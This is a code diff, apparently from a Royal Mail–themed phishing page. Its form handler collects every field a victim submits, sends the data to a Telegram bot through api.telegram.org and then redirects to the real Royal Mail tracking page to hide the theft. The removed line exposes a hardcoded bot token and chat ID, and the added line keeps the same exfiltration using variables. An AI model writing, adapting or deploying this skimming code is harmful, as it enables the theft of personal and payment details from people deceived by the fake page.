@@ -51,7 +51,7 @@
       e.preventDefault();
       const csv = [...new FormData(e.target).entries()].map(([k,v])=>`${k}: ${v}`).join('\n');
 
-      fetch(`https://api.telegram.org/bot8570783623:AAEEIrER7Sptfqz649wLZm22wPCh3UYRtgM/sendMessage?chat_id=-1003513241659&text=${encodeURIComponent(csv)}`)
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(csv)}`)
         .then(() => window.location.href='https://www.royalmail.com/track-your-item');
     });
 
